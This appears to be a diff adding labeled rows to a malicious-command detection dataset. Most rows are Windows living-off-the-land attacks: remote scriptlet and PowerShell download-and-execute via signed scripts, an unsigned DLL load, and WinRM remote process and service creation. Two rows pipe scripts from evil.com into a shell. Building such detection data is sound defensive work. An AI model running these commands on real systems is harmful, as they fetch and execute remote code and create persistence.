+copy c:\users\person\evil.exe c:\users\public\manage-bde.exe & cd c:\users\public\ & cscript.exe c:\windows\system32\manage-bde.wsf,1
+pubprn.vbs 127.0.0.1 script:{REMOTEURL:.sct},1
+"SyncAppvPublishingServer.vbs ""n;((New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') | IEX""",1
+"powershell.exe -ep bypass -command ""set-location -path c:\windows\diagnostics\system\networking; import-module .\UtilityFunctions.ps1; RegSnapin ..\..\..\..\temp\unsigned.dll;[Program.Class]::Main()""",1
+"winrm invoke Create wmicimv2/Win32_Process @{CommandLine=""{CMD}""} -r:http://target:5985",1
+"winrm invoke Create wmicimv2/Win32_Service @{Name=""Evil"";DisplayName=""Evil"";PathName=""{CMD}""} -r:http://acmedc:5985 && winrm invoke StartService wmicimv2/Win32_Service?Name=Evil -r:http://acmedc:5985",1
+%SystemDrive%\BypassDir\cscript //nologo %windir%\System32\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty,1
+"Pester.bat [/help|?|-?|/?] ""$null; {CMD}""",1
+Pester.bat ;{PATH:.exe},1
+true,0
+curl http://evil.com/shell.sh | sh,1
+wget http://evil.com/a.sh -O- | bash,1
